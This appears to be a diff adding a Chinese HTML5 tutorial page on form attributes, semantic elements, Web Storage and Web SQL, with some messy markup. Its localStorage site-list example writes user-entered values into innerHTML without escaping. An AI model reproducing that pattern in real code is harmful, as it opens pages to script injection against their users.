+            <p>私钥（private key）存储于客户端，公钥（public key）则被发送到服务器。公钥可用于之后验证用户的客户端证书（client certificate）。</p>
+
+            
+<form action="demo_keygen.asp" method="get">
+        用户名: <input type="text" name="usr_name">
+        加密: <keygen name="security">
+        <input type="submit">
+        </form>
+        
+        <h2>HTML5 &lt;output&gt; 元素</h2>
+        <p>&lt;output&gt;  元素用于不同类型的输出，比如计算或脚本输出：</p>
+
+
+        <form oninput="x.value=parseInt(a.value)+parseInt(b.value)">0
+                <input type="range" id="a" value="50">100 +
+                <input type="number" id="b" value="50">=
+                <output name="x" for="a b"></output>
+                </form>
+                
+
+    <!--END HTML5 表单元素-->
+
+    <!--HTML 表单属性-->
+
+    <h2>HTML5 新的表单属性</h2>
+    <p>HTML5 的 &lt;form&gt; 和 &lt;input&gt;标签添加了几个新属性.</p>
+    <p>&lt;form&gt;新属性：</p>
+    <ul>
+    <li>autocomplete</li>
+        <li>novalidate</li>
+    </ul>
+    <p> &lt;input&gt;新属性：</p>
+    <ul>
+    <li>autocomplete</li>
+        <li>autofocus</li>
+        <li>form</li>
+        <li>formaction</li>
+        <li>formenctype</li>
+        <li>formmethod</li>
+        <li>formnovalidate</li>
+        <li>formtarget</li>
+        <li>height 与 width</li>
+        <li>list</li>
+        <li>min 与 max</li>
+        <li>multiple</li>
+        <li>pattern (regexp)</li>
+        <li>placeholder</li>
+        <li>required</li>
+        <li>step</li>
+    </ul>
+    <hr>
+
+    <h2>&lt;form&gt; / &lt;input&gt; autocomplete 属性</h2>
+    <p>autocomplete 属性规定 form 或 input 域应该拥有自动完成功能。</p>
+    <p>当用户在自动完成域中开始输入时，浏览器应该在该域中显示填写的选项。</p>
+    <p><b>提示:</b>  autocomplete 属性有可能在 form元素中是开启的，而在input元素中是关闭的。</p>
+    <p><strong>注意:</strong> autocomplete 适用于 &lt;form&gt; 标签，以及以下类型的 &lt;input&gt; 标签：text, search, url, telephone, email, password, datepickers, range 以及 color。</p>
+
+    
+<form action="demo-form.php" autocomplete="on">
+        First name:<input type="text" name="fname"><br>
+        Last name: <input type="text" name="lname"><br>
+        E-mail: <input type="email" name="email" autocomplete="off"><br>
+        <input type="submit">
+      </form>
+
+      <p><strong>提示:</strong>某些浏览器中，您可能需要启用自动完成功能，以使该属性生效。</p>
+      <hr>
+      <h2>&lt;form&gt; novalidate 属性</h2>
+      <p>novalidate 属性是一个 boolean(布尔) 属性.</p>
+      <p>novalidate 属性规定在提交表单时不应该验证 form 或 input 域。</p>
+
+
+      <form action="demo-form.php" novalidate>
+            E-mail: <input type="email" name="user_email">
+            <input type="submit">
+          </form>
+
+          <h2>&lt;input&gt; autofocus 属性</h2>
+          <p>autofocus 属性是一个 boolean 属性.</p>
+          <p>autofocus 属性规定在页面加载时，域自动地获得焦点。</p>
+
+
+          First name:<input type="text" name="fname" autofocus>
+          <h2>&lt;input&gt; form 属性</h2>
+          <p>form 属性规定输入域所属的一个或多个表单。</p>
+          <p><b>提示:</b>如需引用一个以上的表单，请使用空格分隔的列表。</p>
+        <p>位于form表单外的 input 字段引用了 HTML form (该 input 表单仍然属于form表单的一部分):</p>
+          <form action="demo-form.php" id="form1">
+                First name: <input type="text" name="fname"><br>
+                <input type="submit" value="提交">
+              </form>
+               
+              Last name: <input type="text" name="lname" form="form1">
+              <h2>&lt;input&gt; formaction 属性</h2>
+              <p>The formaction 属性用于描述表单提交的URL地址.</p>
+              <p>The formaction 属性会覆盖&lt;form&gt; 元素中的action属性.</p>
+              <p><b>注意: </b>The formaction 属性用于 type="submit" 和 type="image".</p>
+              <div class="example">
+              <p>以下HTMLform表单包含了两个不同地址的提交按钮：</p>
+              
+
+              <form action="demo-form.php">
+                    First name: <input type="text" name="fname"><br>
+                    Last name: <input type="text" name="lname"><br>
+                    <input type="submit" value="提交"><br>
+                    <input type="submit" formaction="demo-admin.php"
+                    value="提交">
+                  </form>
+                  
+
+              <br><hr>
+              <h2>&lt;input&gt; formenctype 属性</h2>
+              <p> formenctype 属性描述了表单提交到服务器的数据编码 (只对form表单中 method="post" 表单)</p>
+              <p>formenctype 属性覆盖 form 元素的 enctype 属性。</p>
+              <p><b>主要: </b>该属性与 type="submit" 和 type="image" 配合使用。</p>
+              <div class="example">
+              <img style="float:right" src="/images/compatible_opera2020.gif" title="Opera" alt="Opera" width="20" height="20" align="middle"><img style="float:right" src="/images/compatible_safari2020.gif" title="Safari" alt="Safari" width="20" height="20" align="middle"><img style="float:right" src="/images/compatible_chrome2020.gif" title="Chrome" alt="Chrome" width="20" height="20" align="middle"><img style="float:right" src="/images/compatible_firefox2020.gif" title="Firefox" alt="Firefox" width="20" height="20" align="middle"><img style="float:right" src="/images/compatible_ie2020.gif" title="Internet Explorer" alt="Internet Explorer" width="20" height="20" align="middle"><h2 class="example">实例</h2>
+              <p>第一个提交按钮已默认编码发送表单数据，第二个提交按钮以 "multipart/form-data" 编码格式发送表单数据:</p>
+              <div class="example_code notranslate">
+                
+                  <div class="hl-main"><span class="hl-brackets">&lt;</span><span class="hl-reserved">form</span><span class="hl-code"> </span><span class="hl-var">action</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">demo-post_enctype.php</span><span class="hl-quotes">"</span><span class="hl-code"> </span><span class="hl-var">method</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">post</span><span class="hl-quotes">"</span><span class="hl-brackets">&gt;</span><span class="hl-code">
+                First name: </span><span class="hl-brackets">&lt;</span><span class="hl-reserved">input</span><span class="hl-code"> </span><span class="hl-var">type</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">text</span><span class="hl-quotes">"</span><span class="hl-code"> </span><span class="hl-var">name</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">fname</span><span class="hl-quotes">"</span><span class="hl-brackets">&gt;</span><span class="hl-brackets">&lt;</span><span class="hl-reserved">br</span><span class="hl-brackets">&gt;</span><span class="hl-code">
+                </span><span class="hl-brackets">&lt;</span><span class="hl-reserved">input</span><span class="hl-code"> </span><span class="hl-var">type</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">submit</span><span class="hl-quotes">"</span><span class="hl-code"> </span><span class="hl-var">value</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">提交</span><span class="hl-quotes">"</span><span class="hl-brackets">&gt;</span><span class="hl-code">
+                </span><span class="hl-brackets">&lt;</span><span class="hl-reserved">input</span><span class="hl-code"> </span><span class="hl-var">type</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">submit</span><span class="hl-quotes">"</span><span class="hl-code"> </span><span class="hl-var">formenctype</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">multipart/form-data</span><span class="hl-quotes">"</span><span class="hl-code">
+                </span><span class="hl-var">value</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">以 Multipart/form-data 提交</span><span class="hl-quotes">"</span><span class="hl-brackets">&gt;</span><span class="hl-code">
+              </span><span class="hl-brackets">&lt;/</span><span class="hl-reserved">form</span><span class="hl-brackets">&gt;</span></div>
+                
+              </div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_input_formenctype">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>&lt;input&gt; formmethod  属性</h2>
+              <p> formmethod 属性定义了表单提交的方式。</p>
+              <p> formmethod 属性覆盖了 &lt;form&gt; 元素的的method 属性。</p>
+              <p><b>注意:</b> 该属性可以与 type="submit" 和 type="image" 配合使用。</p>
+              <div class="example">
+             
+              <p>重新定义表单提交方式实例:</p>
+              <div class="example_code notranslate">
+                  <div class="hl-main"><span class="hl-brackets">&lt;</span><span class="hl-reserved">form</span><span class="hl-code"> </span><span class="hl-var">action</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">demo-form.php</span><span class="hl-quotes">"</span><span class="hl-code"> </span><span class="hl-var">method</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">get</span><span class="hl-quotes">"</span><span class="hl-brackets">&gt;</span><span class="hl-code">
+                First name: </span><span class="hl-brackets">&lt;</span><span class="hl-reserved">input</span><span class="hl-code"> </span><span class="hl-var">type</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">text</span><span class="hl-quotes">"</span><span class="hl-code"> </span><span class="hl-var">name</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">fname</span><span class="hl-quotes">"</span><span class="hl-brackets">&gt;</span><span class="hl-brackets">&lt;</span><span class="hl-reserved">br</span><span class="hl-brackets">&gt;</span><span class="hl-code">
+                Last name: </span><span class="hl-brackets">&lt;</span><span class="hl-reserved">input</span><span class="hl-code"> </span><span class="hl-var">type</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">text</span><span class="hl-quotes">"</span><span class="hl-code"> </span><span class="hl-var">name</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">lname</span><span class="hl-quotes">"</span><span class="hl-brackets">&gt;</span><span class="hl-brackets">&lt;</span><span class="hl-reserved">br</span><span class="hl-brackets">&gt;</span><span class="hl-code">
+                </span><span class="hl-brackets">&lt;</span><span class="hl-reserved">input</span><span class="hl-code"> </span><span class="hl-var">type</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">submit</span><span class="hl-quotes">"</span><span class="hl-code"> </span><span class="hl-var">value</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">提交</span><span class="hl-quotes">"</span><span class="hl-brackets">&gt;</span><span class="hl-code">
+                </span><span class="hl-brackets">&lt;</span><span class="hl-reserved">input</span><span class="hl-code"> </span><span class="hl-var">type</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">submit</span><span class="hl-quotes">"</span><span class="hl-code"> </span><span class="hl-var">formmethod</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">post</span><span class="hl-quotes">"</span><span class="hl-code"> </span><span class="hl-var">formaction</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">demo-post.php</span><span class="hl-quotes">"</span><span class="hl-code">
+                </span><span class="hl-var">value</span><span class="hl-code">=</span><span class="hl-quotes">"</span><span class="hl-string">使用 POST 提交</span><span class="hl-quotes">"</span><span class="hl-brackets">&gt;</span><span class="hl-code">
+              </span><span class="hl-brackets">&lt;/</span><span class="hl-reserved">form</span><span class="hl-brackets">&gt;</span></div>
+              </div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_input_formmethod">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>&lt;input&gt; formnovalidate 属性</h2>
+              <p> novalidate 属性是一个 boolean 属性.</p>
+              <p>novalidate属性描述了 &lt;input&gt; 元素在表单提交时无需被验证。</p>
+              <p>formnovalidate 属性会覆盖 &lt;form&gt; 元素的novalidate属性.</p>
+              <p><strong>注意:</strong>  formnovalidate 属性与type="submit一起使用</p><p>
+              </p><div class="example">
+              <img style="float:right" src="/images/compatible_opera2020.gif" title="Opera" alt="Opera" width="20" height="20" align="middle"><img style="float:right" src="/images/incompatible_safari2020.gif" title="Safari" alt="Safari" width="20" height="20" align="middle"><img style="float:right" src="/images/compatible_chrome2020.gif" title="Chrome" alt="Chrome" width="20" height="20" align="middle"><img style="float:right" src="/images/compatible_firefox2020.gif" title="Firefox" alt="Firefox" width="20" height="20" align="middle"><img style="float:right" src="/images/compatible_ie2020.gif" title="Internet Explorer" alt="Internet Explorer" width="20" height="20" align="middle"><h2 class="example">实例</h2>
+              <p>两个提交按钮的表单(使用与不适用验证 ):</p>
+              <div class="example_code notranslate">
+                  &lt;form action="demo-form.php"&gt;<br>
+                  &nbsp;
+                  E-mail: &lt;input type="email" name="userid"&gt;&lt;br&gt;<br>
+                  &nbsp;
+                  &lt;input type="submit" value="提交"&gt;&lt;br&gt;<br>
+                  &nbsp;
+                  &lt;input type="submit" formnovalidate value="不验证提交"&gt;<br>
+                  &lt;/form&gt;
+              </div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_input_formnovalidate">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>&lt;input&gt; formtarget 属性</h2>
+              <p>formtarget 属性指定一个名称或一个关键字来指明表单提交数据接收后的展示。</p>
+              <p>The formtarget 属性覆盖 &lt;form&gt;元素的target属性.</p>
+              <p><b>注意:</b>  formtarget 属性与type="submit" 和 type="image"配合使用.</p>
+              <div class="example">
+             
+              <p>两个提交按钮的表单, 在不同窗口中显示:</p>
+              <div class="example_code notranslate">
+                  &lt;form action="demo-form.php"&gt;<br>
+                  &nbsp;
+                  First name: &lt;input type="text" name="fname"&gt;&lt;br&gt;<br>
+                  &nbsp;
+                  Last name: &lt;input type="text" name="lname"&gt;&lt;br&gt;<br>
+                  &nbsp;
+                  &lt;input type="submit" value="正常提交"&gt;<br>
+              &nbsp; &lt;input type="submit" formtarget="_blank"<br>
+              &nbsp; value="提交到一个新的页面上"&gt;<br>
+                  &lt;/form&gt;
+              </div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_input_formtarget">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>&lt;input&gt; height 和 width 属性</h2>
+              <p>height 和 width 属性规定用于 image 类型的 &lt;input&gt; 标签的图像高度和宽度。</p>
+              <p><b>注意:</b> height 和 width 属性只适用于 image 类型的&lt;input&gt; 标签。</p>
+              <p><b>提示:</b>图像通常会同时指定高度和宽度属性。如果图像设置高度和宽度，图像所需的空间
+              在加载页时会被保留。如果没有这些属性，
+              浏览器不知道图像的大小，并不能预留
+              适当的空间。图片在加载过程中会使页面布局效果改变
+              （尽管图片已加载）。</p>
+              <div class="example">
+              <img style="float:right" src="/images/compatible_opera2020.gif" title="Opera" alt="Opera" width="20" height="20" align="middle"><img style="float:right" src="/images/compatible_safari2020.gif" title="Safari" alt="Safari" width="20" height="20" align="middle"><img style="float:right" src="/images/compatible_chrome2020.gif" title="Chrome" alt="Chrome" width="20" height="20" align="middle"><img style="float:right" src="/images/compatible_firefox2020.gif" title="Firefox" alt="Firefox" width="20" height="20" align="middle"><img style="float:right" src="/images/compatible_ie2020.gif" title="Internet Explorer" alt="Internet Explorer" width="20" height="20" align="middle"><h2 class="example">实例</h2>
+              <p>定义了一个图像提交按钮, 使用了 height 和 width 属性:</p>
+              
+              <div class="example_code notranslate">
+                  &lt;input type="image" src="img_submit.gif" alt="Submit" width="48" 
+                  height="48"&gt;
+              </div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_input_height_width">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>&lt;input&gt; list 属性</h2>
+              <p>list 属性规定输入域的 datalist。datalist 是输入域的选项列表。</p>
+              <div class="example">
+              
+              <p class="example">在 &lt;datalist&gt;中预定义 &lt;input&gt; 值:</p>
+              <div class="example_code notranslate">
+                
+                  &lt;input list="browsers"&gt;<br><br>
+                  &lt;datalist id="browsers"&gt;<br>
+                  &nbsp; &lt;option value="Internet Explorer"&gt;<br>
+              &nbsp; &lt;option value="Firefox"&gt;<br>
+              &nbsp; &lt;option value="Chrome"&gt;<br>
+              &nbsp; &lt;option value="Opera"&gt;<br>
+              &nbsp; &lt;option value="Safari"&gt;<br>
+                  &lt;/datalist&gt;
+              </div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_datalist">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>&lt;input&gt; min 和 max 属性</h2>
+              <p>min、max 和 step 属性用于为包含数字或日期的 input 类型规定限定（约束）。</p>
+              <p><strong>注意:</strong> min、max 和 step 属性适用于以下类型的 &lt;input&gt; 标签：date pickers、number 以及 range。</p>
+              <div class="example">
+             
+              <p class="example">&lt;input&gt; 元素最小值与最大值设置:</p>
+              <div class="example_code notranslate">
+              Enter a date before 1980-01-01:<br>
+              &lt;input type="date" name="bday" max="1979-12-31"&gt;<br><br>
+              Enter a date after 2000-01-01:<br>
+              &lt;input type="date" name="bday" min="2000-01-02"&gt;<br><br>
+              Quantity (between 1 and 5):<br>
+              &lt;input type="number" name="quantity" min="1" max="5"&gt;</div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_input_max_min">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>&lt;input&gt; multiple 属性</h2>
+              <p>multiple 属性是一个 boolean 属性.</p>
+              <p>multiple 属性规定&lt;input&gt; 元素中可选择多个值。</p>
+              <p><b>注意:</b> multiple 属性适用于以下类型的 &lt;input&gt; 标签：email 和 file: </p>
+              <div class="example">
+              
+              <p class="example">上传多个文件:</p>
+              <div class="example_code notranslate">
+                  Select images: &lt;input type="file" name="img" multiple&gt;</div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_input_multiple">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>&lt;input&gt; pattern 属性</h2>
+              <p> pattern 属性描述了一个正则表达式用于验证 &lt;input&gt; 元素的值。</p>
+              <p><b>注意:</b>pattern 属性适用于以下类型的 &lt;input&gt; 标签: text, search, url, tel, email, 和 password.</p>
+              <p><strong>提示：</strong> 是用来全局 <a href="/tags/tag-title.html">title</a> 属性描述了模式.</p>
+              <p><b>提示：</b> 您可以在我们的 <a href="/js/js-tutorial.html">JavaScript 教程</a>中学习到有关正则表达式的内容</p>
+              <div class="example">
+             
+              <p class="example">下面的例子显示了一个只能包含三个字母的文本域（不含数字及特殊字符）：</p>
+              <div class="example_code notranslate">
+                  Country code: &lt;input type="text" name="country_code" pattern="[A-Za-z]{3}" 
+                  title="Three letter country code"&gt;</div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_input_pattern">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>&lt;input&gt; placeholder 属性</h2>
+              <p>placeholder 属性提供一种提示（hint），描述输入域所期待的值。</p>
+              <p>简短的提示在用户输入值前会显示在输入域上。</p>
+              <p><b>注意:</b> placeholder 属性适用于以下类型的 &lt;input&gt;  标签：text, search, url, telephone, email 以及 password。</p>
+              <div class="example">
+              
+              <p class="example">input 字段提示文本t:</p>
+              <div class="example_code notranslate">
+                  &lt;input type="text" name="fname" placeholder="First name"&gt;</div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_input_placeholder">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>&lt;input&gt; required 属性</h2>
+              <p> required 属性是一个 boolean 属性.</p>
+              <p>required 属性规定必须在提交之前填写输入域（不能为空）。</p>
+              <p><b>注意:</b>required 属性适用于以下类型的 &lt;input&gt; 标签：text, search, url, telephone, email, password, date pickers, number, checkbox, radio 以及 file。</p>
+              <div class="example">
+             
+              <p class="example">不能为空的input字段:</p>
+              <div class="example_code notranslate">
+                  Username: &lt;input type="text" name="usrname" required&gt;</div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_input_required">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>&lt;input&gt; step 属性</h2>
+              <p>step 属性为输入域规定合法的数字间隔。</p>
+              <p>如果 step="3"，则合法的数是 -3,0,3,6 等</p>
+              <p><b>提示：</b>  step 属性可以与
+              max 和 min 属性创建一个区域值.</p>
+              <p><strong>注意:</strong>  step 属性与以下type类型一起使用: number, range, date, datetime, datetime-local, month, time 和 week.</p>
+              <div class="example">
+              
+              <p class="example">规定input step步长为3:</p>
+              <div class="example_code notranslate">
+                  &lt;input type="number" name="points" step="3"&gt;</div>
+              <br><a class="tryitbtn" target="_blank" href="/try/try.php?filename=tryhtml5_input_step">尝试一下 »</a>
+              </div>
+              <br><hr>
+              <h2>HTML5 &lt;input&gt; 标签</h2>
+              <table class="am-table am-table-bordered am-table-radius">
+              <tbody><tr>
+              <th width="150" align="left">标签</th>
+              <th align="left">描述</th>
+              </tr>
+              <tr>
+              <td><a href="/tags/tag-form.html">&lt;form&gt;</a></td>
+              <td>定义一个form表单</td>
+              </tr>
+              <tr>
+              <td><a href="/tags/tag-input.html">&lt;input&gt;</a></td>
+              <td>定义一个 input 域</td>
+            </tr>
+        </tbody></table>	
+
+    <!--end HTML 表单属性-->
+
+    <!--HTML5 语义元素-->
+
+    <h1>HTML5 <span class="color_h1">语义元素</span>
+    </h1>
+    <hr>
+    <p class="intro">语义= 意义</p>
+    <p class="intro">语义元素 = 有意义的元素</p>
+    <hr>
+    <h2>什么是语义元素?</h2>
+    <p>一个语义元素能够清楚的描述其意义给浏览器和开发者。</p>
+    <p><strong>无语义</strong> 元素实例: &lt;div&gt; 和 &lt;span&gt; - 无需考虑内容.</p>
+    <p><strong>语义</strong>元素实例: &lt;form&gt;, &lt;table&gt;, and &lt;img&gt; - 清楚的定义了它的内容.</p>
+    <hr>
+
+    <h2>HTML5中新的语义元素</h2>
+    <p>许多现有网站都包含以下HTML代码：
+    &lt;div id="nav"&gt;, &lt;div class="header"&gt;, 或者 &lt;div id="footer"&gt;, 
+    来指明导航链接, 头部, 以及尾部.</p>
+    
+    <div style="width:374px;float:left">
+    <p>HTML5提供了新的语义元素来明确一个Web页面的不同部分:</p>
+    <ul>
+    <li>&lt;header&gt;</li>
+        <li>&lt;nav&gt;</li>
+        <li>&lt;section&gt;</li>
+        <li>&lt;article&gt;</li>
+        <li>&lt;aside&gt;</li>
+        <li>&lt;figcaption&gt;</li>
+        <li>&lt;figure&gt;</li>
+        <li>&lt;footer&gt;</li>
+    </ul>
+    </div>
+    <hr>
+    <h2>HTML5 &lt;section&gt; 元素</h2>
+
+    <h2>HTML5 &lt;article&gt; 元素</h2>
+    <p> &lt;article&gt; 标签定义独立的内容。.</p>
+    
+    <p>&lt;article&gt; 元素使用实例:</p>
+    <ul>
+    <li>Forum post</li>
+        <li>Blog post</li>
+        <li>News story</li>
+        <li>Comment</li>
+    </ul>
+
+
+    <article>
+            <h1>Internet Explorer 9</h1>
+            <p>Windows Internet Explorer 9(缩写为 IE9 )在2011年3月14日21:00 发布。</p>
+          </article>
+       
+          
+<nav>
+        <a href="/html/">HTML</a> |
+        <a href="/css/">CSS</a> |
+        <a href="/js/">JavaScript</a> |
+        <a href="/jquery/">jQuery</a>
+    </nav>
+    
+
+    <p>My family and I visited The Epcot center this summer.</p>
+    
+   <aside>
+     <h4>Epcot Center</h4>
+     <p>The Epcot Center is a theme park in Disney World, Florida.</p>
+   </aside>
+   
+
+   <article>
+        <header>
+          <h1>Internet Explorer 9</h1>
+          <p><time pubdate datetime="2011-03-15"></time></p>
+        </header>
+        <p>Windows Internet Explorer 9(缩写为 IE9 )是在2011年3月14日21:00发布的</p>
+      </article>
+      
+
+      <footer>
+            <p>Posted by: Hege Refsnes</p>
+            <p><time pubdate datetime="2012-03-01"></time></p>
+          </footer>
+        
+          
+<figure>
+        <img src="img_pulpit.jpg" alt="The Pulpit Rock" width="304" height="228">
+        <figcaption>Fig1. - The Pulpit Pock, Norway.</figcaption>
+      </figure>
+      
+    <!--END HTML5 语义元素-->
+
+    <!--HTML5 Web存储-->
+
+    <h1>HTML5 <span class="color_h1">Web 存储</span>
+    </h1>
+    <hr>
+    <p class="intro">HTML5 web 存储,一个比cookie更好的本地存储方式。</p>
+    <hr>
+    <h2>什么是 HTML5 Web 存储?</h2>
+    <p>使用HTML5可以在本地存储用户的浏览数据。</p>
+    <p>早些时候,本地存储使用的是 cookie。但是Web 存储需要更加的安全与快速. 这些数据不会被保存在服务器上，但是这些数据只用于用户请求网站数据上.它也可以存储大量的数据，而不影响网站的性能.</p>
+    <p>数据以 键/值 对存在, web网页的数据只允许该网页访问使用。</p>
+    <hr>
+    <h2>浏览器支持</h2>
+
+    <h2>localStorage 和 sessionStorage&nbsp;</h2>
+    <p>客户端存储数据的两个对象为：</p>
+    <ul>
+    <li>localStorage - 没有时间限制的数据存储</li>
+        <li>sessionStorage - 针对一个 session 的数据存储</li>
+    </ul>
+    <p>在使用 web 存储前,应检查浏览器是否支持 localStorage 和sessionStorage:</p>
+
+    <p>
+        
+    if(typeof(Storage)!=="undefined")
+    {
+        // 是的! 支持 localStorage  sessionStorage 对象!
+        // 一些代码.....
+    } else {
+        // 抱歉! 不支持 web 存储。
+    }
+
+    </p>
+
+    <div id="result"></div>
+    <script>
+    if(typeof(Storage)!=="undefined")
+    {
+        //存储
+        localStorage.sitename="菜鸟教程";
+        //查找
+        document.getElementById("result").innerHTML="网站名：" + localStorage.sitename;
+    }
+    else
+    {
+      document.getElementById("result").innerHTML="对不起，您的浏览器不支持 web 存储。";
+    }
+    </script>
+
+    不管是 localStorage，还是 sessionStorage，可使用的API都相同，常用的有如下几个（以localStorage为例）：</p>
+    <ul><li>
+    保存数据：localStorage.setItem(key,value);</li><li>
+    读取数据：localStorage.getItem(key);</li><li>
+    删除单个数据：localStorage.removeItem(key);</li><li>
+    删除所有数据：localStorage.clear();</li><li>
+    得到某个索引的key：localStorage.key(index);</li></ul>
+
+    <p><strong>提示:</strong> 键/值对通常以字符串存储，你可以按自己的需要转换该格式。</p>
+    <p>下面的实例展示了用户点击按钮的次数。</p><p>
+    代码中的字符串值转换为数字类型:</p>
+
+    <h2> sessionStorage 对象</h2>
+    <p>sessionStorage 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。</p>
+    <p>如何创建并访问一个 sessionStorage:</p>
+
+    <script>
+        function clickCounter()
+        {
+            if(typeof(Storage)!=="undefined")
+            {
+                if (sessionStorage.clickcount)
+                {
+                    sessionStorage.clickcount=Number(sessionStorage.clickcount)+1;
+                }
+                else
+                {
+                    sessionStorage.clickcount=1;
+                }
+                document.getElementById("result").innerHTML="在这个会话中你已经点击了该按钮 " + sessionStorage.clickcount + " 次 ";
+            }
+            else
+            {
+                document.getElementById("result").innerHTML="抱歉，您的浏览器不支持 web 存储";
+            }
+        }
+    </script>
+
+    <h2>Web Storage 开发一个简单的网站列表程序</h2>
+    <p>网站列表程序实现以下功能：</p>
+    <ul><li>
+    可以输入网站名，网址，以网站名作为key存入localStorage；</li><li>
+    根据网站名，查找网址；</li><li>
+    列出当前已保存的所有网站；</li>
+    </ul>
+    <p>以下代码用于保存于查找数据：</p>
+
+    <div style="border: 2px dashed #ccc;width:320px;text-align:center;">     
+        <label for="sitename">网站名(key)：</label>  
+        <input type="text" id="sitename" name="sitename" class="text"/>  
+        <br/>  
+        <label for="siteurl">网 址(value)：</label>  
+        <input type="text" id="siteurl" name="siteurl"/>  
+        <br/>  
+        <input type="button" onclick="save()" value="新增记录"/>  
+        <hr/>  
+        <label for="search_phone">输入网站名：</label>  
+        <input type="text" id="search_site" name="search_site"/>  
+        <input type="button" onclick="find()" value="查找网站"/>  
+        <p id="find_result"><br/></p>  
+    </div>  
+    <br/>  
+    <div id="list">  
+    </div>  
+    <script>
+	// 载入所有存储在localStorage的数据
+	loadAll(); 	
+		
+    //保存数据  
+    function save(){  
+        var siteurl = document.getElementById("siteurl").value;  
+        var sitename = document.getElementById("sitename").value;  
+        localStorage.setItem(sitename, siteurl);
+        alert("添加成功");
+    }
+    //查找数据  
+    function find(){  
+        var search_site = document.getElementById("search_site").value;  
+        var sitename = localStorage.getItem(search_site);  
+        var find_result = document.getElementById("find_result");  
+        find_result.innerHTML = search_site + "的网址是：" + sitename;  
+    }
+    //将所有存储在localStorage中的对象提取出来，并展现到界面上
+    function loadAll(){  
+        var list = document.getElementById("list");  
+        if(localStorage.length>0){  
+            var result = "<table border='1'>";  
+            result += "<tr><td>网站名</td><td>网址</td></tr>";  
+            for(var i=0;i<localStorage.length;i++){  
+                var sitename = localStorage.key(i);  
+                var siteurl = localStorage.getItem(sitename);  
+                result += "<tr><td>"+sitename+"</td><td>"+siteurl+"</td></tr>";  
+            }  
+            result += "</table>";  
+            list.innerHTML = result;  
+        }else{  
+            list.innerHTML = "数据为空……";  
+        }  
+    }      
+    </script>
+
+    <!--END HTML5 Web存储-->
+
+    <!--HTML5 Web SQL-->
+
+    <h1>HTML5 Web SQL 数据库
+    </h1>
+    <p>Web SQL 数据库 API 并不是 HTML5 规范的一部分，但是它是一个独立的规范，引入了一组使用 SQL 操作客户端数据库的 APIs。</p>
+    <p>如果你是一个 Web 后端程序员，应该很容易理解 SQL 的操作。</p>
+    <p>你也可以参考我们的 <a href="/sql/sql-tutorial.html">SQL 教程</a>，了解更多数据库操作知识。</p>
+    <p>Web SQL 数据库可以在最新版的  Safari, Chrome 和 Opera 浏览器中工作。</p>
+    <hr>
+    <h2>核心方法</h2>
+    <p>以下是规范中定义的三个核心方法：</p>
+    <ol>
+    <li><strong>openDatabase</strong>：这个方法使用现有的数据库或者新建的数据库创建一个数据库对象。</li>
+    <li><strong>transaction</strong>：这个方法让我们能够控制一个事务，以及基于这种情况执行提交或者回滚。</li>
+    <li><strong>executeSql</strong>：这个方法用于执行实际的 SQL 查询。</li>
+    </ol>
+    <hr>
+
+    <h2>打开数据库</h2>
+    <p>我们可以使用 openDatabase() 方法来打开已存在的数据库，如果数据库不存在，则会创建一个新的数据库，使用代码如下：</p>
+    <p>var db = openDatabase('mydb', '1.0', 'Test DB', 2 * 1024 * 1024);</p>
+
+    <p>openDatabase() 方法对应的五个参数说明：</p>
+    <ol>
+    <li>数据库名称</li>
+    <li>版本号</li>
+    <li>描述文本</li>
+    <li>数据库大小</li>
+    <li>创建回调</li>
+    </ol>
+    <p>第五个参数，创建回调会在创建数据库后被调用。</p>
+    <hr>
+
+    <h2>执行查询操作</h2>
+    <p>
+        执行操作使用 database.transaction() 函数： 
+    </p>
+
+    <h2>插入数据</h2>
+    <p>在执行上面的创建表语句后，我们可以插入一些数据：</p>
+
+    <h2>读取数据</h2>
